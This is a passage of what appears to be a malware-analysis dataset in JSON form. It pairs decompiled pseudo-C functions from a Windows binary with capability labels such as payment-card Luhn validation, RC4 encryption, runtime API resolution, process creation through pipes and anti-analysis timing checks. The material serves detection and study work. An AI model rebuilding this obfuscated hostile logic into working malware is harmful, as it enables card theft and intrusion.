(*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n    }\n    return;\n}\n",
        "token_count": 652
    },
    "0040209d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint fcn.0040209d(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint unaff_EBX;\n    uint uVar5;\n    uint unaff_ESI;\n    \n    uVar1 = *0x42e44c;\n    uVar5 = 0;\n    uVar2 = fcn.00406209(0x4120ec, 0xb, 0xb9f4c7d5);\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(uVar2);\n    if (iVar3 != 0) {\n        uVar2 = fcn.00405e30(0x4120f8, 0x18, 0xe841537b, 0);\n        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, uVar2);\n        if (pcVar4 != NULL) {\n            uVar5 = (*pcVar4)(uVar1, 1, unaff_ESI, unaff_EBX);\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 250
    },
    "004020ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004020ff(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    uVar1 = fcn.00406209(0x412114, 0xc, 0xdb372d4b);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.00405e30(0x412124, 0xc, 0xe1bc8078, 0);\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, uVar1);\n        if (pcVar3 != NULL) {\n            uVar4 = (*pcVar3)(arg_8h, 0, arg_ch, 0, arg_10h, arg_14h, arg_18h);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 250
    },
    "004022e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004022e8(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint extraout_ECX;\n    uint arg_ch;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hMem;\n    \n    var_ch = 0;\n    cVar1 = fcn.004022bd();\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.00405e30(0x412134, 0x11, 0x483d48e1, 0);\n        arg_ch = 0;\n        fcn.0040f475(uVar2, extraout_ECX);\n        uVar2 = fcn.0040f598();\n        iVar3 = fcn.00408bae(uVar2, arg_ch);\n        if (iVar3 != 0) {\n            var_8h = 0;\n            iVar3 = fcn.00408bae(iVar3, &var_8h);\n            if (iVar3 != 0) {\n                hMem = 0;\n                var_10h = 0;\n                iVar3 = (*_sym.imp.CRYPT32.dll_CryptDecodeObjectEx)\n                                  (0x10001, 8, iVar3, var_8h, 0x8000, 0, &hMem, &var_10h);\n                if (iVar3 != 0) {\n                    fcn.0040209d(hMem, &var_ch);\n                    (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n                }\n                fcn.00406445();\n            }\n            fcn.00406445();\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 385
    },
    "0040248d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040248d(uint param_1)\n\n{\n    uint uVar1;\n    uint *arg_ch;\n    uint *arg_10h;\n    uint var_c8h;\n    \n    arg_ch = &var_c8h;\n    uVar1 = fcn.00406209(0x412178, 0x1c, 0xf6d92a98, param_1);\n    fcn.0040889b(uVar1, arg_ch);\n    arg_10h = &var_c8h;\n    uVar1 = fcn.00406209(0x412198, 8, 0xf79f58be, arg_ch);\n    fcn.004093ae(0x42e660, uVar1, arg_10h);\n    return;\n}\n",
        "token_count": 176
    },
    "004024e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004024e6(uint arg_8h)\n\n{\n    uint uVar1;\n    uint *arg_ch;\n    uint *arg_10h;\n    uint var_cch;\n    \n    arg_ch = &var_cch;\n    uVar1 = fcn.00406209(0x4121a4, 0x26, 0x32eac7fb);\n    fcn.0040889b(uVar1, arg_ch);\n    arg_10h = &var_cch;\n    uVar1 = fcn.00406209(0x412198, 8, 0xf79f58be, arg_ch);\n    fcn.004093ae(arg_8h, uVar1, arg_10h);\n    return;\n}\n",
        "token_count": 169
    },
    "004026a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004026a5(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t unaff_EBP;\n    uint pszPath;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.0040fe60(0x412a00, 0x214);\n    if (*0x42f17c == '\\0') {\n        arg_10h = 0;\n        arg_ch = fcn.00404fb5();\n        fcn.004034d6(*(unaff_EBP + 8), arg_ch, arg_10h);\n        *0x42f17c = '\\x01';\n        *(unaff_EBP + -4) = 0;\n        fcn.0040471f(*(unaff_EBP + 8));\n        *(unaff_EBP + -4) = 0xffffffff;\n        (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0, 0, 0, unaff_EBP + -0x224);\n        fcn.00404da7(unaff_EBP + -0x224);\n        *(unaff_EBP + -4) = 1;\n        fcn.00403128(*(unaff_EBP + 8));\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.0040fe9b();\n    return;\n}\n",
        "token_count": 321
    },
    "00402a2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00402a2c(void)\n\n{\n    uint8_t *in_EAX;\n    uint arg_8h;\n    uint32_t uVar1;\n    uint var_14h;\n    uint uStack19;\n    uint uStack15;\n    ushort uStack11;\n    uchar uStack9;\n    uint32_t var_4h;\n    \n    arg_8h = fcn.00405e30(0x4121f0, 0x22, 0xa06d4c39, 0);\n    uVar1 = fcn.00409488(arg_8h, *in_EAX);\n    if (uVar1 != 0) {\n        var_14h._0_1_ = 0;\n        stack0xffffffe9 = 0;\n        uStack19 = 0;\n        uStack15 = 0;\n        uStack11 = 0;\n        uStack9 = 0;\n        fcn.004083cf(var_4h, uVar1, &var_14h);\n        uVar1 = fcn.00406445();\n        uVar1 = uVar1 & 0xffffff00;\n        var_4h = CONCAT11(var_14h, stack0xffffffe9);\n    }\n    return uVar1 & 0xffff0000 | var_4h & 0xffff;\n}\n",
        "token_count": 307
    },
    "00403022": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403022(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_ch;\n    int32_t *ppv;\n    uint32_t var_4h;\n    \n    ppv = NULL;\n    iVar1 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar1) {\n        iVar1 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x411a68, 0, 0x17, 0x411548, &ppv);\n        if (-1 < iVar1) {\n            uVar2 = fcn.0040f418();\n            if ((uVar2 != 0) && (var_4h = 0,  uVar2 != 0)) {\n                do {\n                    iVar1 = fcn.0040f43f(var_4h);\n                    if (iVar1 != 0) {\n                        uVar3 = fcn.00405e30(0x4122ac, 4, 0x9977ffb1, 0);\n                        fcn.0040f475(uVar3);\n                        iVar1 = fcn.0040f598();\n                        if (iVar1 != 0) {\n                            uVar3 = fcn.00405e30(\"S-.\\nf\\x16\", 6, 0xf33b4a97, 0);\n                            fcn.0040f475(uVar3);\n                            iVar4 = fcn.0040f531();\n                            if ((iVar4 != 0) && (iVar1 = fcn.00408e9a(iVar1),  iVar1 != 0)) {\n                                for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                    (**(*ppv + 0x50))(ppv, iVar1, 0, 0);\n                                }\n                                fcn.00406445();\n                            }\n                        }\n                    }\n                    var_4h = var_4h + 1;\n                } while (var_4h < uVar2);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return;\n}\n",
        "token_count": 498
    },
    "00403128": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403128(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    \n    uVar1 = fcn.00405e30(0x4122bc, 7, 0xdc623e5d, 0);\n    iVar2 = fcn.0040f475(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.00405e30(0x4122c4, 5, 0x8613e860, 0);\n        fcn.0040f475(uVar1);\n        iVar3 = fcn.0040f531();\n        if (iVar3 != 0) {\n            uVar1 = fcn.00405e30(0x4122ac, 4, 0x9977ffb1, 0);\n            iVar2 = fcn.0040f475(uVar1);\n            if (iVar2 != 0) {\n                fcn.00403022(iVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "004036cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.004036cf(ushort *arg_8h, uint arg_ch)\n\n{\n    ushort uVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    ushort *extraout_ECX;\n    int32_t iVar4;\n    ushort *puVar5;\n    uint var_ch;\n    ushort *var_8h;\n    ushort *var_4h;\n    \n    iVar4 = *in_EAX;\n    puVar5 = 0x8;\n    var_8h = fcn.00406338(8);\n    var_4h = var_8h;\n    while (iVar4 != 0) {\n        uVar2 = fcn.00406209(0x41233c, 6, 0x9a9ee35b, puVar5, 6);\n        iVar3 = (*_sym.imp.SHLWAPI.dll_StrCmpNIW)(arg_8h, uVar2);\n        if (iVar3 == 0) {\n            fcn.00403675(&var_8h, &var_4h, arg_ch);\n            arg_8h = arg_8h + 6;\n            iVar4 = iVar4 + -6;\n            puVar5 = extraout_ECX;\n        }\n        else {\n            uVar1 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            *var_4h = uVar1;\n            iVar4 = iVar4 + -1;\n            puVar5 = var_4h;\n            var_4h = var_4h + 1;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 370
    },
    "0040374f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040374f(int32_t *arg_8h, int32_t *arg_ch, uint lpString2, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString2);\n    *in_EAX = (*in_EAX - arg_14h) + uVar3;\n    if (arg_14h < uVar3) {\n        iVar1 = *arg_ch;\n        iVar2 = *arg_8h;\n        iVar4 = fcn.004063a5();\n        *arg_8h = iVar4;\n        *arg_ch = iVar4 + (iVar1 - iVar2);\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)(*arg_ch, lpString2);\n    *arg_ch = *arg_ch + uVar3;\n    return;\n}\n",
        "token_count": 229
    },
    "004037a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004037a2(uchar *arg_8h)\n\n{\n    uchar uVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_18h;\n    int32_t var_ch;\n    uchar *var_8h;\n    uchar *var_4h;\n    \n    iVar4 = *in_EAX;\n    var_ch = iVar4;\n    var_8h = fcn.00406338(8);\n    var_4h = var_8h;\n    while (iVar4 != 0) {\n        uVar2 = fcn.00405e30(0x41233c, 6, 0x9a9ee35b, 0);\n        iVar3 = (*_sym.imp.SHLWAPI.dll_StrCmpNIA)(arg_8h, uVar2, 6);\n        if (iVar3 == 0) {\n            fcn.00408a74();\n            fcn.00409217(&var_18h);\n            fcn.0040374f(&var_8h, &var_4h, &var_18h, 6);\n            arg_8h = arg_8h + 6;\n            iVar4 = iVar4 + -6;\n        }\n        else {\n            uVar1 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            *var_4h = uVar1;\n            iVar4 = iVar4 + -1;\n            var_4h = var_4h + 1;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 367
    },
    "00403f4d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.00403f4d(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint unaff_EDI;\n    int64_t iVar6;\n    uint var_1h;\n    \n    uVar5 = 0;\n    bVar1 = true;\n    uVar3 = fcn.00405e30(0x412424, 7, 0x33298c2d, 0);\n    iVar4 = fcn.0040f475(uVar3);\n    if ((iVar4 != 0) && (cVar2 = fcn.00403ed8(),  cVar2 == '\\0')) {\n        uVar3 = fcn.00405e30(0x41242c, 7, 0x253159fb, 0);\n        fcn.0040f475(uVar3);\n        iVar6 = fcn.0040f531();\n        *0x42e416 = 1;\n        if (iVar6 == 0) {\n            *0x42e416 = 0;\n        }\n    }\n    uVar3 = fcn.00406209(0x412400, 0x18, 0x5fffde98);\n    iVar4 = fcn.00409c3f(uVar3);\n    if (iVar4 == 0) {\n        uVar3 = fcn.00405e30(0x412434, 5, 0xc7cd4f6c, 0);\n        iVar4 = fcn.0040f475(uVar3);\n        if (iVar4 != 0) {\n            uVar3 = fcn.00405e30(str.Pw_, 8, 0xc8928659, 0);\n            fcn.0040f475(uVar3);\n            iVar6 = fcn.0040f531();\n            bVar1 = true;\n            if (iVar6 == 0) {\n                bVar1 = false;\n            }\n        }\n        uVar3 = fcn.00405e30(0x412448, 7, 0x3f5015a1, 0);\n        iVar4 = fcn.0040f475(uVar3);\n        if (iVar4 == 0) goto code_r0x004040ac;\n        uVar3 = fcn.00405e30(0x412450, 10, 0x2ff19d29, 0);\n        iVar4 = fcn.0040f475(uVar3);\n        if (iVar4 == 0) goto code_r0x004040ac;\n        uVar3 = fcn.00405e30(0x41245c, 9, 0xbe38287c, 0);\n        fcn.0040f475(uVar3);\n        iVar6 = fcn.0040f531();\n        if (iVar6 != 0) {\n            *0x42e417 = 1;\n            goto code_r0x004040ac;\n        }\n    }\n    else {\n        bVar1 = false;\n    }\n    *0x42e417 = 0;\ncode_r0x004040ac:\n    cVar2 = fcn.00403ed8();\n    if (cVar2 == '\\0') {\n        if ((bVar1) && (cVar2 = fcn.00403dce(unaff_EDI),  cVar2 == '\\0')) {\n            *0x414c18 = fcn.00405e30(0x412468, 1, 0x90788621, 0);\n        }\n        else {\n            uVar5 = 1;\n        }\n        return uVar5;\n    }\n    return 1;\n}\n",
        "token_count": 841
    },
    "004040ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004040ef(uint arg_8h, uint hFile, uint hNamedPipe, uint pszPath, int32_t arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uchar lpOutputString;\n    uint s;\n    uint lpBytesLeftThisMessage;\n    uint lpTotalBytesAvail;\n    uint lpNumberOfBytesWritten;\n    uint lpNumberOfBytesRead;\n    int32_t lpBuffer;\n    \n    lpBuffer = fcn.004092af(pszPath);\n    if (lpBuffer != 0) {\n        if (arg_18h != 0) {\n            uVar2 = fcn.00405e30(0x41246c, 3, 0xa020a890, 0);\n            fcn.004094e9(0, uVar2, arg_18h);\n        }\n        uVar2 = fcn.00405e30(0x412470, 2, 0xe3e233a7, 0);\n        uVar2 = fcn.004095cd(uVar2);\n        (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, lpBuffer, uVar2, &lpNumberOfBytesWritten, 0);\n        fcn.00406445();\n        if (arg_1ch != '\\0') {\n            iVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameA)(pszPath);\n            if (iVar3 != 0) {\n                uVar5 = 0;\n                do {\n                    (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n                    iVar4 = fcn.0040855d(iVar3);\n                    if (iVar4 == 0) break;\n                    uVar5 = uVar5 + 1;\n                } while (uVar5 < 0x3c);\n                iVar4 = fcn.0040855d(iVar3);\n                if (iVar4 != 0) {\n                    uVar2 = fcn.00408e9a(iVar3);\n                    fcn.004086b5(uVar2, 1);\n                    fcn.00406445();\n                }\n            }\n            cVar1 = fcn.00403ed8(arg_8h);\n            if (cVar1 != '\\0') {\n                lpOutputString = 0;\n                sub.ntdll.dll_memset(&s, 0, 0x3ff);\n                iVar3 = (*_sym.imp.KERNEL32.dll_PeekNamedPipe)\n                                  (hNamedPipe, &lpOutputString, 0x400, &lpNumberOfBytesRead, &lpTotalBytesAvail, \n                                   &lpBytesLeftThisMessage);\n                if (iVar3 != 0) {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                      (hNamedPipe, &lpOutputString, 0x400, &lpNumberOfBytesRead, 0);\n                    if (iVar3 != 0) {\n                        (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(&lpOutputString);\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 697
    },
    "00404246": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404246(uint arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint lpApplicationName;\n    uint lpBuffer;\n    uint var_94h;\n    uint s;\n    uint var_68h;\n    uint var_64h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint pSecurityDescriptor;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    (*str._Fqv._0_4_)(&pSecurityDescriptor, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(&pSecurityDescriptor, 1, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_CreatePipe;\n    var_1ch = &pSecurityDescriptor;\n    var_20h = 0xc;\n    var_18h = 1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreatePipe)(&var_14h, &var_8h, &var_20h, 0);\n    if (iVar2 != 0) {\n        iVar2 = (*pcVar1)(&var_ch, &var_10h, &var_20h, 0);\n        if (iVar2 != 0) {\n            fcn.00409a3c(&var_34h);\n            (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n            puVar4 = &lpBuffer;\n            uVar3 = fcn.00405e30(0x412474, 10, 0x7895c0b9, 0);\n            (*_sym.imp.USER32.dll_wsprintfA)(&lpApplicationName, uVar3, puVar4);\n            sub.ntdll.dll_memset(&s, 0, 0x40);\n            var_30h = 0;\n            var_2ch = 0;\n            uStack44 = 0;\n            uStack40 = 0;\n            var_64h._0_2_ = 0;\n            var_58h = var_10h;\n            var_54h = var_10h;\n            var_5ch = var_14h;\n            var_94h = 0x44;\n            var_68h = 0x101;\n            iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)\n                              (&lpApplicationName, 0, 0, 0, 1, 0x10, 0, 0, &var_94h, &var_30h);\n            if (iVar2 != 0) {\n                fcn.004040ef(arg_8h, var_8h, var_ch, *arg_ch, arg_ch[1], arg_10h);\n                if (arg_10h != '\\0') {\n                    uVar3 = fcn.00405e30(0x412480, 4, 0xf966284e, 0);\n                    fcn.004040ef(arg_8h, var_8h, var_ch, uVar3, 0, 0);\n                }\n                fcn.00408489();\n                fcn.00408489();\n            }\n            fcn.00408489();\n            fcn.00408489();\n        }\n        fcn.00408489();\n        fcn.00408489();\n    }\n    return;\n}\n",
        "token_count": 849
    },
    "004043e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "move file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004043e0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    uVar1 = fcn.00405e30(0x412488, 0xd, 0xe128ebb6, 0);\n    fcn.0040f475(uVar1);\n    iVar3 = fcn.0040f531();\n    if (iVar3 != 0) {\n        (*_sym.imp.SHELL32.dll_SHChangeNotify)(4, 0x3005, 0x42e780, 0);\n        (*_sym.imp.KERNEL32.dll_MoveFileExW)(0x42e780, 0, 4);\n        uVar1 = fcn.00405e30(str.t_ttGy, 0x4f, 0xcc2b92c3, 0);\n        arg_ch = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(0x42e780, 0x42e780);\n        iVar2 = fcn.00409488(uVar1, arg_ch);\n        if (iVar2 != 0) {\n            var_10h = var_8h;\n            var_ch = 0;\n            fcn.00404246(arg_8h, &var_10h, 0);\n            fcn.00406445();\n        }\n        fcn.004028bf();\n    }\n    return;\n}\n",
        "token_count": 343
    },
    "0040448b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040448b(uint arg_8h)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    uint ARG_0;\n    uint lpBuffer;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    \n    uVar1 = fcn.00405e30(0x4124e8, 0xe, 0x4886e2b9, 0);\n    fcn.0040f475(uVar1);\n    iVar2 = fcn.0040f531();\n    if (iVar2 != 0) {\n        fcn.00409a3c(&var_10h);\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n        puVar3 = &lpBuffer;\n        uVar1 = fcn.00405e30(0x4124f8, 0x10, 0x3d84b5e0, 0);\n        (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, uVar1, puVar3);\n        var_ch = &ARG_0;\n        var_8h = fcn.00405e30(0x41250c, 0x11, 0x42c165bb, 0);\n        fcn.00404246(arg_8h, &var_ch, 1);\n    }\n    return;\n}\n",
        "token_count": 322
    },
    "004045da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004045da(uint param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    uVar4 = 0;\n    uVar1 = fcn.00406209(0x412520, 0x39, 0x13303e62, param_1, &hKey);\n    uVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)(0x80000002, uVar1);\n    if (uVar2 == 0) {\n        var_8h = 4;\n        uVar1 = fcn.00406209(0x41255c, 9, 0xe5711a17, 0, 0, &var_ch, &var_8h);\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, uVar1);\n        if (iVar3 == 0) {\n            uVar4 = var_ch != 0;\n        }\n        uVar2 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 295
    },
    "00404bdf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404bdf(uint arg_8h)\n\n{\n    uint *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00404b70(arg_8h);\n    iVar2 = fcn.004036cf(*in_EAX, uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.00406209(0x4125c8, 5, 0xaff93129, arg_8h, iVar2);\n        fcn.00409428(uVar1, arg_8h);\n        fcn.00406445();\n    }\n    return 0;\n}\n",
        "token_count": 168
    },
    "00404cb9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00404cb9(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    int64_t iVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040fe60(0x4129f0, 0x10);\n    uVar1 = fcn.00405e30(0x4125d0, 10, 0x2a1da1d9, 0);\n    iVar2 = fcn.0040f475(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.00405e30(0x4125dc, 0xe, 0xcb61d4e4, 0);\n        fcn.0040f475(uVar1);\n        iVar3 = fcn.0040f531();\n        if (iVar3 != 0) {\n            *(unaff_EBP + -0x1c) = 0;\n            while (*(unaff_EBP + -0x1c) < *0x42eacc) {\n                fcn.00404c3c(*(unaff_EBP + 0xc));\n                iVar2 = fcn.00404bdf(*(unaff_EBP + 0xc));\n                *(unaff_EBP + -0x20) = iVar2;\n                if (iVar2 != 0) {\n                    *(unaff_EBP + -4) = 0;\n                    uVar1 = fcn.00406209(0x4125ec, 4, 0x777a4559, iVar2, 0, *(unaff_EBP + 0xc), 1);\n                    uVar1 = (*_sym.imp.USER32.dll_GetForegroundWindow)(uVar1);\n                    (*_sym.imp.SHELL32.dll_ShellExecuteW)(uVar1);\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    fcn.00406445();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 1;\n            }\n        }\n    }\n    fcn.0040fe9b();\n    return;\n}\n",
        "token_count": 554
    },
    "00404dd1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00404dd1(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint arg_8h;\n    uint32_t uStack20;\n    \n    uVar1 = fcn.00405e30(0x4125d0, 10, 0x2a1da1d9, 0);\n    iVar2 = fcn.0040f475(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.00405e30(0x4125f4, 10, 0xb53d8af2, 0);\n        fcn.0040f475(uVar1);\n        uVar1 = fcn.0040f598();\n        uVar3 = fcn.00405e30(0x412600, 5, 0xfaa041bd, 0);\n        iVar2 = fcn.0040f475(uVar3);\n        if (iVar2 != 0) {\n            uVar4 = fcn.0040f418();\n            uStack20 = 0;\n            if (uVar4 != 0) {\n                do {\n                    iVar2 = fcn.0040f43f(uStack20);\n                    if (iVar2 != 0) {\n                        uVar3 = fcn.00405e30(0x412608, 0xe, 0xaf2c1cd6, 0);\n                        fcn.0040f475(uVar3);\n                        iVar2 = fcn.0040f598();\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.00405e30(0x412618, 9, 0x28c94c63, 0);\n                            fcn.0040f475(uVar3);\n                            iVar5 = fcn.0040f598();\n                            if (iVar5 != 0) {\n                                iVar5 = fcn.00408bae(iVar5, 0);\n                                if (iVar5 != 0) {\n                                    puVar6 = fcn.00406338(0);\n                                    uVar3 = uVar1;\n                                    arg_8h = fcn.00406209(0x412624, 4, 0xdea71348, uVar1, iVar2);\n                                    fcn.00409428(arg_8h, uVar3);\n                                    uVar3 = fcn.0040383a(iVar5, puVar6 + 3);\n                                    puVar6[2] = uVar3;\n                                    uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*puVar6);\n                                    puVar6[1] = uVar3;\n                                    *0x42eabc = fcn.004063a5();\n                                    iVar2 = *0x42eacc;\n                                    *0x42eacc = *0x42eacc + 1;\n                                    *(*0x42eabc + iVar2 * 4) = puVar6;\n                                    fcn.00406445();\n                                }\n                            }\n                        }\n                    }\n                    uStack20 = uStack20 + 1;\n                } while (uStack20 < uVar4);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 727
    },
    "00405074": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
